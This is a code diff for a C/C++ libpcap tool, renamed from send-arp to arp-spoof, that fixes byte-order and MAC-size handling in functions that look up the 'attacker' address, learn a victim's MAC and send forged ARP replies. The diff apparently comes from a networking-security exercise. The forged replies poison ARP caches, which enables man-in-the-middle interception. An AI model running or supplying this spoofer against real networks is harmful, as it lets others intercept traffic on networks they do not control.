@@ -17,8 +17,8 @@ struct EthArpPacket
 
 void usage()
 {
-    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
+    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
@@ -49,6 +49,7 @@ int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
     }
     struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
     memcpy((void *)attacker_ip, &ip_addr->sin_addr, sizeof(Ip));
+    *attacker_ip = ntohl(*attacker_ip);
 
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1)
     {
@@ -56,7 +57,7 @@ int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
         close(fd);
         return -1;
     }
-    memcpy((void *)attacker_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+    memcpy((void *)attacker_mac, ifr.ifr_hwaddr.sa_data, sizeof(Mac));
 
     close(fd);
     return 0;
@@ -102,11 +103,11 @@ int getSenderMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip,
 
         struct EthHdr *eth_hdr = (struct EthHdr *)(packet);
         struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
-        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && arp_hdr->sip_ == Ip(sender_ip))
+        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == sender_ip)
         {
             if (eth_hdr->dmac_ == attacker_mac)
             {
-                memcpy((void *)sender_mac, &eth_hdr->smac_, ETH_ALEN);
+                memcpy((void *)sender_mac, &eth_hdr->smac_, sizeof(Mac));
                 break;
             }
         }
@@ -129,9 +130,9 @@ int arpInfection(pcap_t *handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac,
     packet_.arp_.pln_ = Ip::SIZE;
     packet_.arp_.op_ = htons(ArpHdr::Reply);
     packet_.arp_.smac_ = attacker_mac;
-    packet_.arp_.sip_ = target_ip;
+    packet_.arp_.sip_ = htonl(Ip(target_ip));
     packet_.arp_.tmac_ = sender_mac;
-    packet_.arp_.tip_ = sender_ip;
+    packet_.arp_.tip_ = htonl(Ip(sender_ip));
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet_), sizeof(EthArpPacket));
     if (res != 0)
@@ -179,9 +180,7 @@ int main(int argc, char *argv[])
     }
 
     Ip attacker_ip;
-    // char attacker_ip[INET_ADDRSTRLEN];
     Mac attacker_mac;
-    // uint8_t attacker_mac[ETH_ALEN];
     if (getMyAddress(dev, &attacker_ip, &attacker_mac) == -1)
     {
         printf("ERR: getMyAddress()\n");
